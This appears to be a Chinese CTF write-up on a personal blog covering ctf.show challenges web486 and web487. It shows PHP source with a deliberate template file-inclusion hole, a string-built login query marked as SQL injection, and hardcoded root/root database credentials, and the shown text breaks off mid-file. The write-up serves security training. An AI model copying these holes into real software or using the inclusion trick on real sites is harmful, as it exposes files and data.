<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>中期测评 | wanan</title><meta name="keywords" content="CTF,ctf.show,中期测评"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web486打开是一个登录   翻一下源码,没发现什么  注册之后登录也没有反应,重点并不是在这里  发现地址有一个login,感觉像是文件包含  尝试包含index.php发现出错,并且看到有一个templates目录, 还有render我们回到html试试 index.php  &lt;?php&#x2F;*# -*- coding: utf-8 -*- Author: h1xa Date:   202">
<meta property="og:type" content="article">
<meta property="og:title" content="中期测评">
<meta property="og:url" content="https://www.wanan.red/ctf.show/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/index.html">
<meta property="og:site_name" content="wanan">
<meta property="og:description" content="web486打开是一个登录   翻一下源码,没发现什么  注册之后登录也没有反应,重点并不是在这里  发现地址有一个login,感觉像是文件包含  尝试包含index.php发现出错,并且看到有一个templates目录, 还有render我们回到html试试 index.php  &lt;?php&#x2F;*# -*- coding: utf-8 -*- Author: h1xa Date:   202">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.pixabay.com/photo/2016/12/14/04/08/thunderbolt-1905603_1280.png">
<meta property="article:published_time" content="2022-10-18T15:01:57.455Z">
<meta property="article:modified_time" content="2022-10-18T14:59:52.062Z">
<meta property="article:author" content="wanan">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="ctf.show">
<meta property="article:tag" content="中期测评">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2016/12/14/04/08/thunderbolt-1905603_1280.png"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg"><link rel="canonical" href="https://www.wanan.red/ctf.show/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><meta name="baidu-site-verification" content="code-e6YD56vlMd"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?882501b6f459073168e4d14d5e29d5e2";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-FYB0HL88QE"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-FYB0HL88QE');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '中期测评',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-10-18 22:59:52'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">72</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">54</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2016/12/14/04/08/thunderbolt-1905603_1280.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">中期测评</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-18T15:01:57.455Z" title="发表于 2022-10-18 23:01:57">2022-10-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-18T14:59:52.062Z" title="更新于 2022-10-18 22:59:52">2022-10-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf-show/">ctf.show</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">17.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>100分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="中期测评"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="web486"><a href="#web486" class="headerlink" title="web486"></a>web486</h1><p>打开是一个登录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220410191856556.png" alt="image-20220410191856556"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220410191923770.png" alt="image-20220410191923770"></p>
<p>翻一下源码,没发现什么</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220410191952963.png" alt="image-20220410191952963"></p>
<p>注册之后登录也没有反应,重点并不是在这里</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220410192022882.png" alt="image-20220410192022882"></p>
<p>发现地址有一个login,感觉像是文件包含</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220410192056235.png" alt="image-20220410192056235"></p>
<p>尝试包含index.php发现出错,并且看到有一个templates目录, 还有render我们回到html试试</p>
<p>index.php</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220410192221515.png" alt="image-20220410192221515"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 18:11:51</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里并没有有用的.我们去查看render_class文件</p>
<p>render&#x2F;render_class.php</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220410192329514.png" alt="image-20220410192329514"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 18:10:19</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">return</span> template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$templateContent</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render&#x2F;file_class文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220410192407141.png" alt="image-20220410192407141"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 17:56:42</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没什么思路,我们试一下包含flag文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220410204859844.png" alt="image-20220410204859844"></p>
<h1 id="web487"><a href="#web487" class="headerlink" title="web487"></a>web487</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220410205121149.png" alt="image-20220410205121149"></p>
<p>一样的页面,但是这次,我们搜到了一个cheak文件这次我们在试一下文件包含</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220410205138507.png" alt="image-20220410205138507"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220410205240261.png" alt="image-20220410205240261"></p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 22:30:08</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>();	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;select id from user where username = md5(&#x27;<span class="subst">$username</span>&#x27;) and password=md5(&#x27;<span class="subst">$password</span>&#x27;) order by id limit 1&quot;</span>;<span class="comment">#这里明显的sql注入</span></span><br><span class="line">	<span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&#x2F;render&#x2F;render_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 22:15:24</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">			<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">			cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&#x2F;render&#x2F;db_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 22:29:27</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		 <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">		 <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">		 <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">		 <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">		 <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable">$addr</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$database</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">		<span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&#x2F;render&#x2F;cache_class</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 21:40:10</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ 